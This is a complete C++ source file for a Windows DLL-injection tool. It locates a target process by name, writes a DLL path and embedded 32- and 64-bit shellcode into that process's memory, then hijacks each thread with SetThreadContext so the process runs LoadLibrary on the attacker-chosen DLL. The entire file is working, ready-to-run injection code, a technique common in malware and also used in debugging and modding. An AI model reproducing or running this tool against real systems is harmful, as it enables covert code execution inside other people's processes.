#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

#include <stdexcept>
#include <vector>
#include <cstdint>
#include <cstdio>
#include <cassert>

/*
 * Shellcode to load a DLL, 32 and 64 bit versions
 *
 * Placeholders:
 *
 * 0x17...17 is the ret address
 * 0x18...18 is the DLL path
 * 0x19...19 is the address of LoadLibrary
 *
 */

const char load_dll_32[] =
        "\x68\x17\x17\x17\x17\x9c\x60\x68\x18\x18\x18\x18\xb8\x19\x19"
        "\x19\x19\xff\xd0\x61\x9d\xc3";

#define SHELLCODE_SIZE_32 (sizeof(load_dll_32)-1)

#ifdef _WIN64
const char load_dll_64[] =
        "\x68\x17\x17\x17\x17\x68\x17\x17\x17\x17\x9c\x50\x53\x51\x52"
        "\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55"
        "\x41\x56\x41\x57\x68\x23\x23\x23\x23\x48\xb9\x18\x18\x18\x18"
        "\x18\x18\x18\x18\x48\xb8\x19\x19\x19\x19\x19\x19\x19\x19\xff"
        "\xd0\x58\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41"
        "\x59\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58\x9d\xc3";

#define SHELLCODE_SIZE_64 (sizeof(load_dll_64)-1)
#endif

// Return the process ID from the process name
DWORD get_process_id_from_name (const char* process_name)
{
    HANDLE thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (thSnapshot == INVALID_HANDLE_VALUE)
        throw std::runtime_error("get_process_id_from_name(): unable to create toolhelp snapshot");

    std::wstring w_process_name(process_name, process_name + strlen(process_name));

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    BOOL retval = Process32First(thSnapshot, &pe);

    while (retval)
    {
        if (StrStrIW(pe.szExeFile, &w_process_name[0]))
        {
            CloseHandle(thSnapshot);
            return pe.th32ProcessID;
        }
        retval = Process32Next(thSnapshot,&pe);
    }

    throw std::runtime_error("get_process_id_from_name(): target process not found");
}

// Return the process' thread ids
std::vector<DWORD> get_process_thread_ids (DWORD pid)
{
    std::vector<DWORD> threads;

    HANDLE thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (thSnapshot == INVALID_HANDLE_VALUE)
        throw std::runtime_error("get_process_thread_id(): unable to create toolhelp snapshot");

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    BOOL retval = Thread32First(thSnapshot, &te);
    while (retval)
    {
        if (te.th32OwnerProcessID == pid)
            threads.push_back(te.th32ThreadID);

        retval = Thread32Next(thSnapshot, &te);
    }

    CloseHandle(thSnapshot);

    if (threads.empty())
        throw std::runtime_error("Failed getting process threads");

    return threads;
}

#ifdef _WIN64
enum class Bitness
{
    Bits32,
    Bits64
};

// Determine whether the process is 32 or 64 bit
Bitness get_process_bitness (DWORD pid)
{
    BOOL isWow64;
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (process == NULL)
        throw std::runtime_error("get_process_bitness(): OpenProcess() failed");
    IsWow64Process(process, &isWow64);
    CloseHandle(process);
    return isWow64 == TRUE ? Bitness::Bits32 : Bitness::Bits64;
}
#endif

// Print the shellcode
void print_shellcode (const void* shellcode, std::size_t size)
{
    const int bytes_per_line = 15;
    for (std::size_t i = 0; i < size; ++i)
    {
        if (!(i%bytes_per_line))
        {
            if (i) printf("\"\n");
            printf("\t\"");
        }
        if (((char *) shellcode)[i] == 0)
            printf("\x1b[1;31m");
        printf("\\x%02x", ((unsigned char *)shellcode)[i]);
        printf("\x1b[0m");
    }
    printf("\";\n");
}

int main (int argc, const char** argv)
{
    HANDLE process = NULL;
    void* p_dll_path = nullptr;
    void* p_shellcode = nullptr;
    std::size_t dll_path_size = 0;
    int SHELLCODE_SIZE = 0;
    int ret = 0;

    try
    {
        if (argc != 3)
        {
            fprintf(stderr, "Usage: dll-inject <dll> <process>\n");
            return 0;
        }
        const char* dll_path = argv[1];
        const char* process_name = argv[2];

        DWORD process_id = get_process_id_from_name(process_name);
        process = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, process_id);
        if (process == NULL)
            throw std::runtime_error("OpenProcess() failed");

#ifdef _WIN64
        const Bitness bitness = get_process_bitness(process_id);
        SHELLCODE_SIZE = bitness == Bitness::Bits32 ? SHELLCODE_SIZE_32 : SHELLCODE_SIZE_64;
        printf("Process: %s (%d bit)\n", process_name, bitness == Bitness::Bits32 ? 32 : 64);
#else
        SHELLCODE_SIZE = SHELLCODE_SIZE_32;
#endif

        // Write the DLL path to process memory
        p_dll_path = VirtualAllocEx(process, NULL, strlen(dll_path)+1, MEM_COMMIT, PAGE_READWRITE);
        dll_path_size = strlen(dll_path)+1;
        if (p_dll_path == NULL)
            throw std::runtime_error("Failed allocating DLL path buffer in process memory");
        if (WriteProcessMemory(process, p_dll_path, dll_path, dll_path_size, NULL) == FALSE)
            throw std::runtime_error("Failed writing DLL path to process memory");

        // Allocate buffer for shellcode in process memory
        p_shellcode = VirtualAllocEx(process, NULL, SHELLCODE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (p_shellcode == NULL)
            throw std::runtime_error("Failed allocating shellcode buffer in process memory");

        // Get address of LoadLibrary to patch shellcode
        FARPROC LoadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (LoadLibraryAddr == NULL)
            throw std::runtime_error("Failed getting address of LoadLibrary()");

        printf("dll path: %p\n", p_dll_path);
        printf("LoadLibrary: %p\n", LoadLibraryAddr);

        // Hijack threads until one succeeds

        std::vector<DWORD> thread_ids = get_process_thread_ids(process_id);
        for (DWORD thread_id : thread_ids)
        {
            HANDLE thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                                       THREAD_SUSPEND_RESUME, false, thread_id);
            if (thread == NULL)
                throw std::runtime_error("Failed getting thread handle");

            printf("Injecting into thread %d\n", thread_id);

            // Inject shellcode into thread
            {
                if (SuspendThread(thread) == -1)
                {
                    fprintf(stderr, "Failed suspending thread\n");
                    continue;
                }
#ifdef _WIN64
                if (bitness == Bitness::Bits64)
                {
                    // Get thread context and make rip point to shellcode
                    CONTEXT ctx;
                    ctx.ContextFlags = CONTEXT_CONTROL;
                    if (GetThreadContext(thread, &ctx) == FALSE)
                        throw std::runtime_error("Failed getting thread context");
                    union
                    {
                        DWORD64 rip;
                        struct
                        {
                            DWORD rip_lo;
                            DWORD rip_hi;
                        };
                    };
                    rip = ctx.Rip;
                    ctx.Rip = (DWORD64) p_shellcode;
                    ctx.ContextFlags = CONTEXT_CONTROL;

                    // Patch shellcode
                    // Copy to vector and make changes there, since string literal
                    // may not be writable
                    std::vector<std::uint8_t> shellcode(SHELLCODE_SIZE);
                    memcpy(&shellcode[0], load_dll_64, SHELLCODE_SIZE);
                    memcpy(&shellcode[1], &rip_hi, sizeof(rip_hi));
                    memcpy(&shellcode[6], &rip_lo, sizeof(rip_lo));
                    memcpy(&shellcode[41], &p_dll_path, sizeof(p_dll_path));
                    memcpy(&shellcode[51], &LoadLibraryAddr, sizeof(LoadLibraryAddr));

                    assert(sizeof(rip_lo) == 4);
                    assert(sizeof(rip_hi) == 4);
                    assert(sizeof(p_dll_path) == 8);
                    assert(sizeof(LoadLibraryAddr) == 8);

                    // Write patched shellcode
                    if (WriteProcessMemory(process, p_shellcode, &shellcode[0], SHELLCODE_SIZE, NULL) == FALSE)
                        throw std::runtime_error("Failed writing shellcode to process memory");

                    printf("rip: %016llX (%08x + %08x)\n", rip, rip_hi, rip_lo);
                    printf("Shellcode (%u bytes):\n", shellcode.size());
                    print_shellcode(&shellcode[0], shellcode.size());

                    // Set new thread context to execute shellcode
                    if (SetThreadContext(thread, &ctx) == FALSE)
                        throw std::runtime_error("Failed setting thread context");
                }
                else // 32 bit
                {
                    // wow64...
                    throw std::runtime_error("wow64 not yet supported");
                }
#else // 32 bits
                // Get thread context and make eip point to shellcode
                CONTEXT ctx;
                ctx.ContextFlags = CONTEXT_CONTROL;
                if (GetThreadContext(thread, &ctx) == FALSE)
                    throw std::runtime_error("Failed getting thread context");
                DWORD eip = ctx.Eip;
                ctx.Eip = (DWORD) p_shellcode;
                ctx.ContextFlags = CONTEXT_CONTROL;

                // Patch shellcode
                // Copy to vector and make changes there, since string literal may not
                // be writable
                std::vector<std::uint8_t> shellcode(SHELLCODE_SIZE);
                memcpy(&shellcode[0], load_dll_32, SHELLCODE_SIZE);
                memcpy(&shellcode[1], &eip, sizeof(eip));
                memcpy(&shellcode[8], &p_dll_path, sizeof(p_dll_path));
                memcpy(&shellcode[13], &LoadLibraryAddr, sizeof(LoadLibraryAddr));

                // Write patched shellcode
                if (WriteProcessMemory(process, p_shellcode, &shellcode[0], SHELLCODE_SIZE, NULL) == FALSE)
                    throw std::runtime_error("Failed writing shellcode to process memory");

                printf("eip: %x\n", eip);
                printf("Shellcode (%u bytes):\n", shellcode.size());
                print_shellcode(&shellcode[0], shellcode.size());

                // Set new thread context to execute shellcode
                if (SetThreadContext(thread, &ctx) == FALSE)
                    throw std::runtime_error("Failed setting thread context");
#endif
                if (ResumeThread(thread) == -1)
                    fprintf(stderr, "Failed resuming thread\n");
            }
            CloseHandle(thread);
        }

        // Give the process enough time to load the DLL before freeing memory
        // and closing all handles
        printf("Waiting for target process to run shellcode...\n");
        fflush(stdout);
        Sleep(3000);
    }
    catch (const std::exception& e)
    {
        fprintf(stderr, "%s (%d)\n", e.what(), GetLastError());
        ret = -1;
    }

    if (p_shellcode) VirtualFreeEx(process, p_shellcode, SHELLCODE_SIZE, MEM_DECOMMIT);
    if (p_dll_path) VirtualFreeEx(process, p_dll_path, dll_path_size, MEM_DECOMMIT);
    if (process != NULL) CloseHandle(process);

    return ret;
}
